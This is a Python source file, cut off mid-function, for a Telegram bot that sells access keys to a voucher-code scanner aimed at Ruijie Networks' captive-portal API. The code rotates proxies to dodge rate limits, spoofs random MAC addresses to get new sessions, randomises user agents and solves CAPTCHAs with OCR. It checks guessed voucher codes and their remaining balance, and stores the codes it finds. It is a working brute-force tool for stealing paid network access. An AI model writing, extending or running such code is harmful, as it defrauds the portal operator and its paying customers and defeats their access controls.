#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# HAUIGAKI x RUIJIE — HYBRID
#   UI / admin commands / key system : HAUIGAKI style
#   Scan engine / workers / proxy    : RUIJIE style (NO tor)
# ============================================================

import asyncio
import aiohttp
import base64
import concurrent.futures
import datetime
import hashlib
import json
import os
import random
import re
import shutil
import signal
import sqlite3
import string
import time
import uuid
from contextlib import contextmanager
from html import escape
from urllib.parse import urljoin, urlsplit

import ddddocr
import emoji
from aiohttp import web
from aiohttp_socks import ProxyConnector
from telebot import types
from telebot.async_telebot import AsyncTeleBot

# ========== CONFIG ==========
# VPS-only copy: the bot token is embedded below. Keep this file private.
HYBRID_BOT_TOKEN = ''
TOKEN_FILE = os.environ.get("BOT_TOKEN_FILE", "bot_token.txt")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
if not BOT_TOKEN and os.path.isfile(TOKEN_FILE):
    with open(TOKEN_FILE, "r", encoding="utf-8") as token_file:
        BOT_TOKEN = token_file.read().strip()
if not BOT_TOKEN:
    BOT_TOKEN = HYBRID_BOT_TOKEN
ADMIN_ID = "5115562507"
BOT_NAME = "HAUIGAKI"
ADMIN_CONTACT = "@Hiuagaki"

if not BOT_TOKEN:
    raise SystemExit("BOT_TOKEN not found.")

# ========== PREMIUM EMOJI (HAUIGAKI style) ==========
PREMIUM_EMOJI_IDS = {
    "🔥": "4956499161319998529",
    "🐇": "6199501437387412202",
    "💳": "5472250091332993630",
    "📝": "4979199472228631981",
    "🌐": "4956560549287560231",
    "🎯": "5287535694099536694",
    "🧠": "5927026418616636353",
    "💠": "5971944878815317190",
    "⚠️": "5420323339723881652",
    "📊": "6032808241891644148",
    "🚀": "6235302918967269680",
    "💎": "4956739572114392015",
    "🎆": "6023660820544623088",
    "🔺": "5971837723676249096",
    "🎀": "6066395745139824604",
    "🔸": "5974235702701853774",
}

UI_EMOJI_ALIASES = {
    "✅": "💠", "❌": "⚠️", "👤": "🔸", "👥": "💠",
    "🔑": "💎", "📄": "📝", "📋": "📝", "📭": "🔸",
    "🔍": "🎯", "📦": "💠", "📢": "🌐", "🔀": "🌐",
    "🔄": "🔸", "🔁": "🔸", "⏳": "🔸", "⏱️": "🔸",
    "⏰": "⚠️", "⚡": "🔥", "⚡️": "🔥", "🛑": "⚠️",
    "🎉": "🎆", "👑": "💎", "ℹ️": "📝", "📡": "🌐",
    "🎫": "💳", "🔴": "⚠️", "♾️": "💎", "🆔": "💠",
    "📌": "📝", "📁": "📝", "📂": "📝",
}

DIVIDER = "━━━━━━━━━━━━━━━━━━━━"
SCAN_MODES = ("6", "7", "8", "9", "6to8", "mix6", "mix7", "a6")


def premium_emoji(text):
    if not text:
        return text

    def convert_visible(fragment):
        pieces = []
        position = 0
        for item in emoji.emoji_list(fragment):
            start, end = item["match_start"], item["match_end"]
            glyph = UI_EMOJI_ALIASES.get(item["emoji"], item["emoji"])
            pieces.append(fragment[position:start])
            emoji_id = PREMIUM_EMOJI_IDS.get(glyph)
            if emoji_id:
                pieces.append(f'<tg-emoji emoji-id="{emoji_id}">{glyph}</tg-emoji>')
            position = end
        pieces.append(fragment[position:])
        return "".join(pieces)

    parts = []
    protected = 0
    for part in re.split(r"(<[^>]+>)", text):
        if part.startswith("<") and part.endswith(">"):
            if re.match(r"<(?:code|pre|a)(?:\s|>)", part, re.I):
                protected += 1
            elif re.match(r"</(?:code|pre|a)>", part, re.I):
                protected = max(0, protected - 1)
            parts.append(part)
        elif protected:
            parts.append(part)
        else:
            parts.append(convert_visible(part))
    return "".join(parts)


def display_expiry(value):
    if value == "9999-12-31T23:59:59Z":
        return "Unlimited"
    try:
        return datetime.datetime.fromisoformat(value.replace("Z", "+00:00")).strftime("%d %b %Y · %H:%M UTC")
    except (TypeError, ValueError):
        return "Unknown"


# ========== DATABASE (HAUIGAKI style, SQLite) ==========
DB_PATH = os.environ.get("DB_PATH", "hauigaki.db")


def get_db_connection():
    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA cache_size=10000")
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keys
                 (key TEXT PRIMARY KEY, user_id TEXT, plan TEXT, expires_at TEXT,
                  code_limit INTEGER DEFAULT 1000, used_codes INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS results
                 (user_id TEXT PRIMARY KEY, codes TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id TEXT PRIMARY KEY, key TEXT, registered_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_settings
                 (user_id TEXT PRIMARY KEY, proxy_enabled INTEGER DEFAULT 1)''')
    c.execute('''CREATE TABLE IF NOT EXISTS sessions
                 (user_id TEXT PRIMARY KEY, session_url TEXT, updated_at TEXT)''')
    # code -> session URL where it was found (only sessions that yielded codes)
    c.execute('''CREATE TABLE IF NOT EXISTS code_sessions
                 (code TEXT PRIMARY KEY, session_url TEXT, user_id TEXT, found_at TEXT)''')
    # migration: track telegram usernames
    try:
        c.execute("ALTER TABLE users ADD COLUMN username TEXT")
    except sqlite3.OperationalError:
        pass  # column already exists
    conn.commit()
    conn.close()


init_db()


@contextmanager
def get_db_cursor():
    conn = get_db_connection()
    try:
        yield conn.cursor()
        conn.commit()
    finally:
        conn.close()


def db_get_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys WHERE key = ?", (key,))
        result = c.fetchone()
        if result:
            return {"key": result[0], "user_id": result[1], "plan": result[2],
                    "expires_at": result[3], "code_limit": result[4], "used_codes": result[5]}
    return None


def db_get_user(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            return {"user_id": result[0], "key": result[1], "registered_at": result[2]}
    return None


def db_get_results(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT codes FROM results WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            return json.loads(result[0])
    return []


def db_save_results(user_id, codes):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO results (user_id, codes) VALUES (?, ?)",
                  (user_id, json.dumps(codes)))


def db_add_user(user_id, key):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO users (user_id, key, registered_at) VALUES (?, ?, ?)",
                  (user_id, key, datetime.datetime.now(datetime.timezone.utc).isoformat()))


def db_set_username(user_id, username):
    if not username:
        return
    with get_db_cursor() as c:
        c.execute("UPDATE users SET username = ? WHERE user_id = ?", (username, str(user_id)))
        if c.rowcount == 0:
            c.execute("INSERT INTO users (user_id, key, registered_at, username) VALUES (?, ?, ?, ?)",
                      (str(user_id), "",
                       datetime.datetime.now(datetime.timezone.utc).isoformat(), username))


def db_get_username(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT username FROM users WHERE user_id = ?", (str(user_id),))
        r = c.fetchone()
        return r[0] if r and r[0] else None


def db_add_key(key, user_id, plan, expires_at, code_limit=1000):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO keys (key, user_id, plan, expires_at, code_limit, used_codes) VALUES (?, ?, ?, ?, ?, ?)",
                  (key, user_id, plan, expires_at, code_limit, 0))


def db_delete_key(key):
    with get_db_cursor() as c:
        c.execute("DELETE FROM keys WHERE key = ?", (key,))


def db_get_all_keys():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys")
        results = c.fetchall()
        keys = {}
        for r in results:
            keys[r[0]] = {"user_id": r[1], "plan": r[2], "expires_at": r[3],
                          "code_limit": r[4], "used_codes": r[5]}
        return keys


def db_get_all_users():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users")
        results = c.fetchall()
        return [r[0] for r in results]


def db_save_session_url(user_id, session_url):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO sessions (user_id, session_url, updated_at) VALUES (?, ?, ?)",
                  (str(user_id), session_url,
                   datetime.datetime.now(datetime.timezone.utc).isoformat()))


def db_get_session_url(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT session_url FROM sessions WHERE user_id = ?", (str(user_id),))
        r = c.fetchone()
        return r[0] if r and r[0] else None


def db_link_code_session(code, session_url, user_id):
    """Remember which session URL a code was found with (only called for
    sessions that actually yielded codes)."""
    if not session_url:
        return
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO code_sessions (code, session_url, user_id, found_at) VALUES (?, ?, ?, ?)",
                  (str(code), session_url, str(user_id),
                   datetime.datetime.now(datetime.timezone.utc).isoformat()))


def db_get_code_session(code):
    """Session URL where this code was originally found, if remembered."""
    with get_db_cursor() as c:
        c.execute("SELECT session_url FROM code_sessions WHERE code = ?", (str(code),))
        r = c.fetchone()
        return r[0] if r and r[0] else None


# ========== KEY FUNCTIONS (HAUIGAKI style) ==========
def is_admin(user_id):
    return str(user_id) == ADMIN_ID


def check_key_expiration(expires_at):
    try:
        if expires_at == "9999-12-31T23:59:59Z":
            return True
        exp_time = datetime.datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        return datetime.datetime.now(datetime.timezone.utc) < exp_time
    except Exception:
        return False


def is_key_valid(user_id):
    user = db_get_user(str(user_id))
    if not user:
        return False
    key_data = db_get_key(user["key"])
    if not key_data:
        return False
    return check_key_expiration(key_data["expires_at"])


def check_access(user_id):
    if is_admin(user_id):
        return True
    return is_key_valid(user_id)


def generate_expiry(plan):
    now = datetime.datetime.now(datetime.timezone.utc)
    plans = {
        "1h": datetime.timedelta(hours=1),
        "1d": datetime.timedelta(days=1),
        "7d": datetime.timedelta(days=7),
        "10d": datetime.timedelta(days=10),
        "15d": datetime.timedelta(days=15),
        "1m": datetime.timedelta(days=30),
        "1y": datetime.timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()


def generate_random_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# ========== PROXY MANAGER (RUIJIE style — file based, NO tor) ==========
# Forgiving design: a proxy cools down only after PROXY_MAX_FAILS *consecutive*
# failures (any success resets the counter), then automatically rejoins rotation
# after PROXY_COOLDOWN_SEC. proxies.txt is never rewritten destructively.
# NOTE: scan traffic NEVER falls back to direct IP — workers idle when no proxy
# is available.
PROXY_FILE = "proxies.txt"
PROXY_MAX_FAILS = 20
PROXY_COOLDOWN_SEC = 120
PROXY_COOLDOWN_ENABLED = False  # user request: no cooldown, retry failed proxies forever
# --- proxy rotation: use only a few proxies at a time, rotate periodically ---
ACTIVE_PROXY_COUNT = 5
ROTATION_INTERVAL_SEC = 180  # 3 minutes
TIMEOUT_SEC = 20


class ProxyManager:
    def __init__(self, file_path):
        self.file_path = file_path
        self.proxies = []
        self.consec_fails = {}
        self.cooldown_until = {}
        self.check_attempts = {}
        self.lock = asyncio.Lock()
        self.index = 0
        self.rotation_start = time.monotonic()
        self.rotation_batch = 0
        self.load()

    def _normalize(self, proxy):
        proxy = (proxy or "").strip()
        if not proxy or proxy.startswith("#"):
            return None
        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            proxy = "socks5://" + proxy
        return proxy

    def _validate_proxy_format(self, proxy):
        try:
            rest = proxy.split("://", 1)[1] if "://" in proxy else proxy
            if "@" in rest:
                rest = rest.split("@", 1)[1]
            if ":" not in rest:
                return False
            host, port = rest.rsplit(":", 1)
            if not host or not port:
                return False
            port_num = int(port)
            return 1 <= port_num <= 65535
        except Exception:
            return False

    def load(self):
        try:
            if not os.path.exists(self.file_path):
                with open(self.file_path, "w") as f:
                    f.write("")
                self.proxies = []
                self.consec_fails = {}
                self.cooldown_until = {}
                self.check_attempts = {}
                return
            with open(self.file_path) as f:
                raw = f.read().splitlines()
            valid = []
            invalid_count = 0
            for line in raw:
                p = self._normalize(line)
                if p and self._validate_proxy_format(p):
                    valid.append(p)
                elif p:
                    invalid_count += 1
            seen = set()
            self.proxies = []
            for p in valid:
                if p not in seen:
                    seen.add(p)
                    self.proxies.append(p)
            random.shuffle(self.proxies)
            self.consec_fails = {}
            self.cooldown_until = {}
            self.check_attempts = {}
            msg = f"[ProxyManager] Loaded {len(self.proxies)} proxies"
            if invalid_count:
                msg += f" ({invalid_count} invalid)"
            print(msg)
        except Exception as e:
            print(f"[ProxyManager] Error: {e}")

    def reload(self):
        self.load()

    def _revive_expired(self):
        now = time.monotonic()
        revived = 0
        for p in [p for p, until in self.cooldown_until.items() if until <= now]:
            del self.cooldown_until[p]
            self.consec_fails.pop(p, None)
            self.check_attempts.pop(p, None)
            revived += 1
        if revived:
            print(f"[ProxyManager] {revived} proxie(s) recovered from cooldown")

    def _active_proxies(self):
        """Current rotation batch: only ACTIVE_PROXY_COUNT proxies are handed
        out at a time; the batch advances every ROTATION_INTERVAL_SEC.
        ACTIVE_PROXY_COUNT <= 0 means all proxies (no batching)."""
        if not self.proxies:
            return []
        if ACTIVE_PROXY_COUNT <= 0:
            return list(self.proxies)
        now = time.monotonic()
        batch = int((now - self.rotation_start) // ROTATION_INTERVAL_SEC)
        n_batches = (len(self.proxies) + ACTIVE_PROXY_COUNT - 1) // ACTIVE_PROXY_COUNT
        cur = batch % n_batches
        if batch != self.rotation_batch:
            self.rotation_batch = batch
            print(f"[ProxyManager] Rotated proxies: batch {cur + 1}/{n_batches} "
                  f"({ACTIVE_PROXY_COUNT} active, every {ROTATION_INTERVAL_SEC}s)")
        start = cur * ACTIVE_PROXY_COUNT
        return self.proxies[start:start + ACTIVE_PROXY_COUNT]

    def rotation_info(self):
        """(current_batch, total_batches, batch_size) for the /proxy display."""
        if not self.proxies:
            return (0, 0, 0)
        if ACTIVE_PROXY_COUNT <= 0:
            return (1, 1, len(self.proxies))
        n_batches = (len(self.proxies) + ACTIVE_PROXY_COUNT - 1) // ACTIVE_PROXY_COUNT
        cur = self.rotation_batch % n_batches
        return (cur + 1, n_batches, min(ACTIVE_PROXY_COUNT, len(self.proxies)))

    def reset_rotation(self):
        """Restart rotation at batch 1 (call after pool size changes)."""
        self.rotation_start = time.monotonic()
        self.rotation_batch = -1
        self.index = 0

    async def get_next(self):
        async with self.lock:
            self._revive_expired()
            now = time.monotonic()
            pool = self._active_proxies()
            available = [p for p in pool if self.cooldown_until.get(p, 0) <= now]
            if not available:
                return None
            p = available[self.index % len(available)]
            self.index += 1
            return p

    async def mark_bad(self, proxy):
        if not proxy:
            return
        if not PROXY_COOLDOWN_ENABLED:
            return  # cooldown disabled — failed proxies are retried forever
        async with self.lock:
            if proxy in self.cooldown_until:
                return
            fails = self.consec_fails.get(proxy, 0) + 1
            self.consec_fails[proxy] = fails
            if fails >= PROXY_MAX_FAILS:
                self.cooldown_until[proxy] = time.monotonic() + PROXY_COOLDOWN_SEC
                self.consec_fails.pop(proxy, None)
                print(f"[ProxyManager] Cooling down a proxy after {fails} consecutive fails "
                      f"({PROXY_COOLDOWN_SEC}s)")

    async def mark_good(self, proxy):
        if not proxy:
            return
        async with self.lock:
            self.consec_fails.pop(proxy, None)

    def get_cooling_proxies(self):
        now = time.monotonic()
        return [p for p in self.proxies if self.cooldown_until.get(p, 0) > now]

    async def revive(self, proxy):
        async with self.lock:
            if proxy in self.cooldown_until:
                del self.cooldown_until[proxy]
            self.consec_fails.pop(proxy, None)
            self.check_attempts.pop(proxy, None)

    async def record_check_fail(self, proxy):
        async with self.lock:
            if proxy not in self.cooldown_until:
                return False
            attempts = self.check_attempts.get(proxy, 0) + 1
            self.check_attempts[proxy] = attempts
            print(f"[ProxyManager] Health check failed "
                  f"({attempts}/{PROXY_CHECK_MAX_ATTEMPTS})")
            return attempts >= PROXY_CHECK_MAX_ATTEMPTS

    async def reset_check_attempts(self, proxy):
        async with self.lock:
            self.check_attempts.pop(proxy, None)

    async def remove_permanently(self, proxy):
        async with self.lock:
            if proxy in self.proxies:
                self.proxies.remove(proxy)
            self.consec_fails.pop(proxy, None)
            self.cooldown_until.pop(proxy, None)
            self.check_attempts.pop(proxy, None)
            try:
                with open(self.file_path, "w") as f:
                    for p in self.proxies:
                        f.write(p + "\n")
                print(f"[ProxyManager] Permanently removed dead proxy "
                      f"({PROXY_CHECK_MAX_ATTEMPTS} failed checks)")
            except OSError as e:
                print(f"[ProxyManager] file rewrite error: {e}")

    def has_proxies(self):
        return len(self.proxies) > 0

    def stats(self):
        now = time.monotonic()
        total = len(self.proxies)
        cooling = sum(1 for p in self.proxies if self.cooldown_until.get(p, 0) > now)
        return total, cooling

    def get_active_count(self):
        now = time.monotonic()
        return sum(1 for p in self.proxies if self.cooldown_until.get(p, 0) <= now)


_proxy_manager = None


def get_proxy_manager():
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager


def create_connector_for_proxy(proxy):
    # No proxies configured -> direct connection
    if not proxy:
        return None
    try:
        if proxy.startswith(("socks4://", "socks5://")):
            return ProxyConnector.from_url(proxy, rdns=True)
        return ProxyConnector.from_url(proxy)
    except Exception:
        return None


def parse_proxy_line(line):
    """Parse one proxy line. Supports:
    - ip:port:user:pass   -> http://user:pass@ip:port
    - http://ip:port, socks5://ip:port, ip:port (normalized later)
    Returns normalized proxy URL or None if invalid."""
    line = (line or "").strip()
    if not line or line.startswith("#"):
        return None
    if "://" not in line and "@" not in line:
        parts = line.split(":")
        if len(parts) == 4:
            ip, port, user, pwd = (p.strip() for p in parts)
            try:
                port_num = int(port)
            except ValueError:
                return None
            if not ip or not user or not (1 <= port_num <= 65535):
                return None
            return f"http://{user}:{pwd}@{ip}:{port_num}"
    # has scheme already, or bare ip:port -> let ProxyManager normalize
    return line


def parse_proxy_list(text):
    """Parse proxy list text into normalized proxies.
    Returns (new_proxies, duplicates, invalid). Does NOT write to file."""
    pm = get_proxy_manager()
    duplicates, invalid = 0, 0
    existing = set(pm.proxies)
    new_proxies = []
    for raw_line in (text or "").splitlines():
        # allow comma/space separated on one line too
        for chunk in re.split(r"[,\s]+", raw_line):
            parsed = parse_proxy_line(chunk)
            if not parsed:
                if chunk.strip():
                    invalid += 1
                continue
            normalized = pm._normalize(parsed)
            if not normalized or not pm._validate_proxy_format(normalized):
                invalid += 1
                continue
            if normalized in existing:
                duplicates += 1
                continue
            existing.add(normalized)
            new_proxies.append(normalized)
    return new_proxies, duplicates, invalid


def import_proxies_from_text(text):
    """Append new proxies from pasted text to proxies.txt.
    Returns (added, duplicates, invalid)."""
    pm = get_proxy_manager()
    new_proxies, duplicates, invalid = parse_proxy_list(text)
    if new_proxies:
        try:
            with open(PROXY_FILE, "a") as f:
                for p in new_proxies:
                    f.write(p + "\n")
        except OSError as e:
            print(f"[proxy-import] write error: {e}")
    pm.reload()
    return len(new_proxies), duplicates, invalid


# ========== PROXY HEALTH-CHECK ENGINE ==========
# While proxies sit in cooldown, this background engine actively probes them:
#   - probe answers -> revive immediately back into rotation
#   - probe fails  -> count it; after PROXY_CHECK_MAX_ATTEMPTS fails the proxy
#                     is permanently deleted (from rotation AND proxies.txt)
# Safety: if EVERY probe in a round fails, the portal/network itself is assumed
# down and nothing is deleted.
PROXY_CHECK_INTERVAL = 60
PROXY_CHECK_MAX_ATTEMPTS = 3


async def check_proxy_alive(proxy):
    """True if any HTTP response comes back through the proxy."""
    connector = create_connector_for_proxy(proxy)
    if connector is None:
        return False
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(PORTAL_BASE,
                                   timeout=aiohttp.ClientTimeout(total=15)):
                return True
    except Exception:
        return False
    finally:
        try:
            await connector.close()
        except Exception:
            pass


PROXY_LIVE_CHECK_URL = "https://www.google.com"


async def check_proxy_live(proxy):
    """VPS-side liveness check via a neutral endpoint (NOT the portal).
    True if the proxy returns HTTP 200. Used by /chkproxy and /addproxy
    so a portal outage never marks proxies dead."""
    connector = create_connector_for_proxy(proxy)
    if connector is None:
        return False
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(PROXY_LIVE_CHECK_URL,
                                   timeout=aiohttp.ClientTimeout(total=12)) as resp:
                return resp.status == 200
    except Exception:
        return False
    finally:
        try:
            await connector.close()
        except Exception:
            pass


CHKPROXY_MAX_STRIKES = 3
CHKPROXY_STRIKES_FILE = "chkproxy_strikes.json"


def _load_chk_strikes():
    try:
        with open(CHKPROXY_STRIKES_FILE) as f:
            data = json.load(f)
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def _save_chk_strikes(strikes):
    try:
        with open(CHKPROXY_STRIKES_FILE, "w") as f:
            json.dump(strikes, f)
    except OSError:
        pass


def _update_chk_strikes(strikes, live, dead):
    """Advance /chkproxy strike counts: a live result clears the proxy's
    strikes; a fail adds one. Returns (strikes, to_remove) — to_remove holds
    the proxies that reached CHKPROXY_MAX_STRIKES consecutive fails."""
    strikes = dict(strikes)
    for p in live:
        strikes.pop(p, None)
    to_remove = []
    for p in dead:
        strikes[p] = int(strikes.get(p, 0)) + 1
        if strikes[p] >= CHKPROXY_MAX_STRIKES:
            to_remove.append(p)
    for p in to_remove:
        strikes.pop(p, None)
    return strikes, to_remove


async def proxy_health_checker():
    await asyncio.sleep(30)  # let startup settle
    pm = get_proxy_manager()
    while True:
        try:
            cooling = pm.get_cooling_proxies()
            if cooling:
                print(f"[proxy-check] Probing {len(cooling)} cooling proxie(s)...")
                sem = asyncio.Semaphore(10)

                async def probe(proxy):
                    async with sem:
                        return proxy, await check_proxy_alive(proxy)

                outcomes = await asyncio.gather(*(probe(p) for p in cooling))
                if all(not alive for _, alive in outcomes):
                    print("[proxy-check] All probes failed — portal/net may be down, "
                          "keeping proxies")
                    for proxy, _ in outcomes:
                        await pm.reset_check_attempts(proxy)
                else:
                    removed = 0
                    for proxy, alive in outcomes:
                        if alive:
                            await pm.revive(proxy)
                        elif await pm.record_check_fail(proxy):
                            await pm.remove_permanently(proxy)
                            removed += 1
                    if removed:
                        try:
                            await bot.send_message(
                                chat_id=int(ADMIN_ID),
                                text=premium_emoji(
                                    f"🗑️ <b>Proxy health check</b>\n"
                                    f"Removed <code>{removed}</code> dead proxie(s) "
                                    f"({PROXY_CHECK_MAX_ATTEMPTS} failed checks)."),
                                parse_mode="HTML")
                        except Exception as e:
                            print(f"[proxy-check] notify error: {e}")
        except asyncio.CancelledError:
            raise
        except Exception as e:
            print(f"[proxy-check] {type(e).__name__}: {e}")
        await asyncio.sleep(PROXY_CHECK_INTERVAL)


# ========== OCR (RUIJIE style — plain ddddocr) ==========
_ocr_instance = None


def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


async def solve_captcha(session, session_id, headers):
    try:
        url = f"{CAPTCHA_IMAGE_URL}?sessionId={session_id}&_t={int(time.time() * 1000)}"
        async with session.get(url, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)) as resp:
            if resp.status != 200:
                return None
            image_content = await resp.read()
        if not image_content:
            return None
        text = await asyncio.to_thread(get_ocr_instance().classification, image_content)
        if not text:
            return None
        return text.strip().upper()
    except Exception:
        return None


# ========== PORTAL (RUIJIE style endpoints) ==========
PORTAL_BASE = "https://portal-as.ruijienetworks.com"
PORTAL_INDEX = PORTAL_BASE + "/download/static/maccauth/src/index.html"
PORTAL_BALANCE_PAGE = PORTAL_BASE + "/download/static/maccauth/src/balance.html?sessionId="
VOUCHER_URL = PORTAL_BASE + "/api/auth/voucher/?lang=en_US"
CAPTCHA_IMAGE_URL = PORTAL_BASE + "/api/auth/captcha/image"
CAPTCHA_VERIFY_URL = PORTAL_BASE + "/api/auth/captcha/verify"
BALANCE_API = PORTAL_BASE + "/api/auth/balance/getBalance/"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
]


def generate_random_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))


def replace_mac(url, new_mac):
    if "mac=" in url:
        return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}mac={new_mac}"


def build_headers(referer=PORTAL_INDEX):
    return {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json; charset=utf-8",
        "user-agent": random.choice(USER_AGENTS),
        "x-requested-with": "XMLHttpRequest",
        "Origin": PORTAL_BASE,
        "Referer": referer,
    }


async def get_sid_from_gateway(session, portal_url):
    mac = generate_random_mac()
    url = replace_mac(portal_url, mac)
    headers = {
        "user-agent": random.choice(USER_AGENTS),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    try:
        async with session.get(url, headers=headers, allow_redirects=True,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)) as resp:
            final_url = str(resp.url)
            try:
                body = await resp.text()
            except Exception:
                body = ""
        m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final_url)
        if m:
            return m.group(1)
        m = re.search(r"sessionId=([a-zA-Z0-9]+)", body)
        if m:
            return m.group(1)
        return None
    except Exception:
        return None


async def validate_session_url(url):
    """Simple non-destructive URL check: is the portal HOST reachable through
    at least ONE proxy? Tries proxies sequentially, first success wins.
    A "request limited" portal response counts as failure (the portal answers
    it with HTTP 200, so the body must be checked too).
    Never fetches the user's challenge URL (single-use chap challenge would
    burn). Returns True if any proxy reaches the host. Read-only."""
    try:
        host = urlsplit(url).hostname
    except Exception:
        host = None
    if not host:
        return False
    probe_url = f"https://{host}/"
    pm = get_proxy_manager()
    for _ in range(5):
        proxy = await pm.get_next()
        if not proxy:
            break
        connector = create_connector_for_proxy(proxy)
        if connector is None:
            continue
        try:
            timeout = aiohttp.ClientTimeout(total=12)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get(probe_url,
                                       headers={"user-agent": random.choice(USER_AGENTS)},
                                       allow_redirects=True) as resp:
                    if resp.status >= 500:
                        continue
                    try:
                        body = await resp.text()
                    except Exception:
                        body = ""
                    low = body.lower()
                    if "request limited" in low or "too many requests" in low:
                        continue
                    return True
        except Exception:
            continue
        finally:
            try:
                await connector.close()
            except Exception:
                pass
    return False


async def can_open_portal_session(session_url):
    """Scan-start gate: can a portal session actually be opened with this URL?
    Uses get_sid_from_gateway (exactly what scan workers use) via up to 3
    proxies sequentially. Returns True if any proxy yields a sessionId.
    Read-only — never marks proxies bad."""
    pm = get_proxy_manager()
    for _ in range(3):
        proxy = await pm.get_next()
        if not proxy:
            break
        connector = create_connector_for_proxy(proxy)
        if connector is None:
            continue
        try:
            timeout = aiohttp.ClientTimeout(total=TIMEOUT_SEC)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                sid = await get_sid_from_gateway(session, session_url)
                if sid:
                    return True
        except Exception:
            continue
        finally:
            try:
                await connector.close()
            except Exception:
                pass
    return False


_balance_debug_logged = 0


def parse_balance_data(data):
    """Parse portal balance JSON. Returns (plan, time_str).
    Positive remaining -> "Xh Ym"; zero/negative -> "Expired" (time used up);
    missing/unparseable -> "Unknown"."""
    res = data.get("result", {}) or data.get("data", {}) or {}
    plan = res.get("profileName") or res.get("planName") or "Unknown"
    remaining = res.get("remainingMinutes")
    if remaining is not None:
        try:
            remaining = int(remaining)
        except (TypeError, ValueError):
            return plan, "Unknown"
        if remaining > 0:
            hh, mm = divmod(remaining, 60)
            return plan, (f"{hh}h {mm}m" if hh else f"{mm}m")
        return plan, "Expired"
    total = res.get("totalMinutes") or res.get("totalTime")
    if total is not None:
        try:
            total = int(total)
        except (TypeError, ValueError):
            total = None
        if total and total > 0:
            hh, mm = divmod(total, 60)
            return plan, (f"{hh}h {mm}m" if hh else f"{mm}m")
    return plan, "Unknown"


async def fetch_balance(session, session_id):
    """Balance lookup on the worker's own session (same cookies/proxy).
    Unknown/unverifiable remaining time is reported as Unknown (HAUIGAKI style).
    Returns (plan, time_str)."""
    global _balance_debug_logged
    if not session_id:
        return "Unknown", "Unknown"
    url = f"{BALANCE_API}{session_id}"
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/json;",
        "user-agent": random.choice(USER_AGENTS),
        "x-requested-with": "XMLHttpRequest",
        "Origin": PORTAL_BASE,
        "Referer": PORTAL_BALANCE_PAGE + session_id,
    }
    last = ("Unknown", "Unknown")
    for attempt in range(2):
        try:
            async with session.get(url, headers=headers,
                                   timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)) as resp:
                if resp.status != 200:
                    break
                try:
                    data = await resp.json(content_type=None)
                except Exception:
                    break
                if _balance_debug_logged < 5:
                    _balance_debug_logged += 1
                    print(f"[balance-debug] raw: {str(data)[:400]}")
                plan, time_str = parse_balance_data(data)
                last = (plan, time_str)
                if time_str == "Unknown" and attempt == 0:
                    await asyncio.sleep(1)
                    continue
                return plan, time_str
        except Exception:
            break
    return last


async def check_single_access_code(session, code, session_id, headers, proxy):
    """RUIJIE style single voucher check. Returns hit/limit/bad/net/captcha.
    Captcha solve+verify is retried up to 7 times per call (user spec
    2026-10-09); the worker may also retry the whole code up to 3 times."""
    if not session_id:
        return "net"
    try:
